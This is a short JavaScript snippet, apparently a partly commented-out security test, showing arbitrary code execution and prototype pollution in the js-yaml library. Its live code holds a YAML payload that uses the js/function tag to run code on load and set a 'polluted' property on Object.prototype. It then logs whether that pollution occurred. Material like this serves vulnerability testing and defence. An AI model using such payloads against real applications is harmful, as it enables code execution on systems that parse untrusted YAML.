// test("Arbitrary code execution in js-yaml", () => {
//   expect.assertions(2);
  const payload =
    "{ toString: !<tag:yaml.org,2002:js/function> 'function (){return (this.constructor.prototype.polluted=`yes`)}' } : 1";
  const jsyaml = require("js-yaml");
console.log({}.polluted);
  try {
    jsyaml.load(payload);
  } catch (error) {}
console.log({}.polluted);
// });
